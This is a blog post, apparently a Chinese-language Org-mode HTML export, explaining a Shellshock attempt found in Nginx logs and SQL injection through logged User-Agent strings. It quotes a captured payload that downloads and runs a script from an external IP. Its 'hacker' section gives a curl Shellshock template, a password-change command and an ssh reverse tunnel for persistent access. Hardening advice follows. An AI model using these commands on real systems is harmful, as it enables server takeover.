@@ -1,0 +1,440 @@
+---
+title: shellshock and user-agent injection
+layout: page
+permalink: /security/injection/2016/12/11/shellshock-sql-injection.html
+---
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2016-12-11 Sun 16:01 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta  name="viewport" content="width=device-width, initial-scale=1" />
+<title>User Agent  and one of the SQL injection</title>
+<meta  name="generator" content="Org-mode" />
+<meta  name="author" content="CJ" />
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css"
+    href="/css/htmlize.css"/>
+
+<link rel="stylesheet" type="text/css"
+    href="/css/bigblow.css"/>
+
+<link rel="stylesheet" type="text/css"
+    href="/css/hideshow.css"/>
+
+<script type="text/javascript"
+    src="/js/jquery-1.11.0.min.js"></script>
+
+<script type="text/javascript"
+    src="/js/jquery-ui-1.10.2.min.js"></script>
+
+<script type="text/javascript"
+    src="/js/jquery.localscroll-min.js"></script>
+
+<script type="text/javascript"
+    src="/js/jquery.scrollTo-1.4.3.1-min.js"></script>
+
+<script type="text/javascript"
+    src="/js/jquery.zclip.min.js"></script>
+
+<script type="text/javascript"
+    src="/js/bigblow.js"></script>
+
+<script type="text/javascript"
+    src="/js/hideshow.js"></script>
+
+<script type="text/javascript"
+    src="/js/jquery.stickytableheaders.min.js"></script>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script type="text/javascript"
+        src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content">
+	<!-- <h1 class="title">User Agent  and one of the SQL injection</h1> -->
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline9">1. Attack</a>
+<ul>
+<li><a href="#orgheadline6">1.1. Attack with Shellshock</a>
+<ul>
+<li><a href="#orgheadline1">1.1.1. Notification Mail</a></li>
+<li><a href="#orgheadline2">1.1.2. What is the CGI and how it works</a></li>
+<li><a href="#orgheadline3">1.1.3. Shellshock</a></li>
+<li><a href="#orgheadline4">1.1.4. How to be a hacker easier</a></li>
+<li><a href="#orgheadline5">1.1.5. How to protect your system</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline7">1.2. SQL Injection</a></li>
+<li><a href="#orgheadline8">1.3. End</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgheadline9" class="outline-2">
+<h2 id="orgheadline9"><span class="section-number-2">1</span> Attack</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+在记录了这么多的文档、笔记中，重要要在这个公众号中发一篇和攻击相关的记录了。
+写这篇内容的起因，是因为我在做 Nginx 日志分析的时候，用了 JSON 格式记录日志，
+但是某些不能被 JSON 解析的格式当做异常日志用邮件发了出来，其中一条日志引起了
+我的注意。
+</p>
+</div>
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">1.1</span> Attack with Shellshock</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+看到这个副标题的时候，大概会想到 2014 年 9 月闹的沸沸扬扬的事件，那个礼拜内，几乎
+我加过的所有行业内的 QQ 群都在讨论它，影响非常大。
+</p>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-4">
+<h4 id="orgheadline1"><span class="section-number-4">1.1.1</span> Notification Mail</h4>
+<div class="outline-text-4" id="text-1-1-1">
+<p>
+在今天凌晨 01：30 的时候，我收到一封邮件，邮件内容是一条完整的 Nginx 日志，日志中
+的 User-Agent 是这样的
+</p>
+
+<p>
+"http_user_agent": "() { :;}; /bin/bash -c \x22rm -rf /tmp/w*;wget <a href="http://178.18.24.165/wp2">http://178.18.24.165/wp2</a> -O /tmp/wp2;curl -o /tmp/wp2 <a href="http://178.18.24.165/wp2;chmod">http://178.18.24.165/wp2;chmod</a> +x /tmp/wp2;sh /tmp/wp2;rm -rf /tmp/w*\x22"
+</p>
+
+<p>
+在这里，\x22 表示单引号，将其中的命令忽略后大概会变成这样：
+</p>
+
+<p>
+() { :;}; /bin/bash -c 'command'
+</p>
+
+<p>
+这个先放在这里，接下来还要提到两个前。
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-4">
+<h4 id="orgheadline2"><span class="section-number-4">1.1.2</span> What is the CGI and how it works</h4>
+<div class="outline-text-4" id="text-1-1-2">
+<p>
+事实上 CGI、FastCGI 等等这些都是不同的东西，但是和主题无关，所以这里统称它们为 CGI，
+CGI 的技术是用来在 WEB 中解析动态语言的而生成动态页面的技术，比如，Nginx 本身并没有
+处理任何语言的能力，但是它能将请求转发给能够处理这些请求的其他服务，这里的“其他服务”
+指的就是 CGI 了。
+</p>
+
+<p>
+在忽略各个 CGI 之间的区别的时候，我在这里用管理 FastCGI 的 PHP-FPM + Nginx 来举例，当
+Nginx 接收到一个请求之后，Nginx 将当前这个请求的所有参数：包括 <i><b>环境变量</b></i> 、HTTP header
+等数据发送给 PHP-FPM，PHP-FPM 主进程接收到这个请求后，调用已启动或者如果需要的话，
+启动一个新的进程来处理。
+</p>
+
+<p>
+注意这里的 <i><b>环境变量</b></i>
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-4">
+<h4 id="orgheadline3"><span class="section-number-4">1.1.3</span> Shellshock</h4>
+<div class="outline-text-4" id="text-1-1-3">
+<p>
+不得不说，我这篇小文章谢了好几个小时了，因为我在边看恐怖片边写，真受不了自己 - -|||
+</p>
+
+<p>
+在 Bash 4.3 之前的版本中，有一个 BUG，这个 BUG 事实上曾经被发现过，但是当时以为这个
+BUG 只有在登录系统之后才能被执行，所以没有人理会它，它被当成一个可忽略的小问题。
+</p>
+
+<p>
+而 CGI ！！！，我记得之前看过一篇文章，一个国外的大佬写的，大意是说 CGI 这种东西，是
+一个非常烂的技术，根本不应该被开发出来。
+</p>
+
+<p>
+再回到刚才那个 User-Agent 的例子中：
+</p>
+
+<p>
+() { :;}; /bin/bash -c 'command'
+</p>
+
+<p>
+() { :;}; 这个部分是在定义一个没有名字且没有任何操作的的空函数
+</p>
+
+<p>
+而在 Bash 4.3 之前的版本中，几乎所有版本都有这样一个问题，那就是在定义这样一个空函数时，
+并不检查尾部何时结束，而是执行所有 () { 之后的命令(操作)。
+</p>
+
+<p>
+所以，在本例中，当 Nginx 接收到一个请求后，会将它的 Header 发送给 CGI，而 CGI 会将这些
+数据放到系统的环境变量中，而在初始化这些环境变量的时候，Boom~ 这个 User-Agent 在初始化
+的过程中就会被执行了。
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-4">
+<h4 id="orgheadline4"><span class="section-number-4">1.1.4</span> How to be a hacker easier</h4>
+<div class="outline-text-4" id="text-1-1-4">
+<p>
+即使你不会使用更高级的语言，光会一个 curl 便可以简单的攻击并且攻击一个基于 Nginx、
+其他 CGI 的程序，再加上一个低版本的 Bash，如果对方的 FPM 是跑在 root 账号下，并且
+允许 root 通过 ssh 远程登录的话，嘿嘿嘿~~~
+</p>
+
+<p>
+你只需要在 curl 命令行中指定你要执行的命令就好，比如:
+</p>
+
+<p>
+curl &#x2013;user-agent "() { :;}; <i>bin/bash -c \x22 command \x22" <a href="http://xxx.xx.xxx">http://xxx.xx.xxx</a></i>
+</p>
+
+<p>
+这里的 command 可以像上述示例中的行为一样，从你的服务器上下载一个脚本，然后
+执行它，比如，先修改密码，然后，嘿嘿嘿~~~，有的服务器是在内网的，通过 nat 映射
+ HTTP 端口出网，但是，如果像下面这样：
+</p>
+
+<p>
+echo "somthing you wanna password" | passwd &#x2013;stdin
+</p>
+
+<p>
+ssh -C -f -N -g -R 1235:localhost:22 &lt;your ip&gt; -p &lt;your ssh port&gt;
+</p>
+
+<p>
+这条命令的作用是在对方的服务器上执行，将对方的 22 端口的映射到你的服务器的 1235
+端口上，这样的话，即使对方是隐藏在 NAT 的网络里，你仍旧可以通过登录在你自己的
+服务器的 IP 的 1235 端口来登录到对方的服务器。
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-4">
+<h4 id="orgheadline5"><span class="section-number-4">1.1.5</span> How to protect your system</h4>
+<div class="outline-text-4" id="text-1-1-5">
+<p>
+有了上边的例子，就要有防范别人对你这么干，所以，如果有以下这样几个条件，也就能防
+止大多数攻击了。
+</p>
+<ol class="org-ol">
+<li>首先第一点就是升级你的 Bash，如果这个漏洞两年过去了你还没升级，呵呵呵呵~</li>
+<li>任何服务都不应该跑在 root 账号下</li>
+<li>root 不应该被允许 ssh 登录</li>
+<li>跑服务的用户不应该被允许登录，我通常的做法是将它的 shell 改为 /sbin/nologin</li>
+<li>严格控制文件系统中各目录的权限，让这些用来跑服务的账号尽可能的减少对非工作目录
+读写的权限</li>
+</ol>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">1.2</span> SQL Injection</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+上例中说的是一种典型的注入攻击，Shell 注入，很有意思哈~
+</p>
+
+<p>
+现在简单说一个同样利用 User-Agent 来注入 SQL 的过程，事实上也是我正在犯的一个错，
+</p>
+
+<p>
+我做过，现在也在做一些日志分析的工具，将来也要做更大的日志分析平台，在我过去以及
+现在做的日志分析工具的中，我会把 User-Agent、以及其他信息直接保存到数据库中，Just
+like MySQL。
+</p>
+
+<p>
+所以，当你在直接把这些嵌套了 SQL 语句的内容保存的 MySQL 中的时候，这些语句将会被执行。
+</p>
+
+<p>
+大家更常见的是你的面向用户的程序中的 SQL 注入，所以会忽略类似这样的攻击，好吧，
+可能并不是所有人，但至少我是其中之一，呵呵哒
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-3">
+<h3 id="orgheadline8"><span class="section-number-3">1.3</span> End</h3>
+<div class="outline-text-3" id="text-1-3">
+<p>
+上一篇说了我会选择记录一篇 KeepAlived，看起来得下次了。
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="author">Author: CJ</p>
+<p class="date">Created: 2016-12-11 Sun 16:01</p>
+<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
+</div>
+</body>
+</html>
